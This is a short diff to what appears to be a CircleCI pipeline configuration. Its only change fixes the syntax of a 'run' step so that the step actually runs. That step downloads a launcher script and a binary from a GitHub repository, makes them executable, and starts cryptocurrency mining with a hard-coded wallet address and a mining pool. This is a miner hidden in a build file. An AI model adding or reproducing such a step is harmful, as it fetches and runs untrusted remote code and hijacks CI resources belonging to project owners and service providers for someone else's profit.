@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo argon2/chukwav2 -wallet btcmzRPgDhcKjhrWKj5EjjXzDECmA6sKnPp6FQ7i3iRVNhUxuquWg5z8v6ShoZHkhThKDiPMJRgqNhoZYXozFyvr7FfS7PKzTG7 -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 pool.semipool.com:22209
+      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo argon2/chukwav2 -wallet btcmzRPgDhcKjhrWKj5EjjXzDECmA6sKnPp6FQ7i3iRVNhUxuquWg5z8v6ShoZHkhThKDiPMJRgqNhoZYXozFyvr7FfS7PKzTG7 -rigName $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 pool.semipool.com:22209
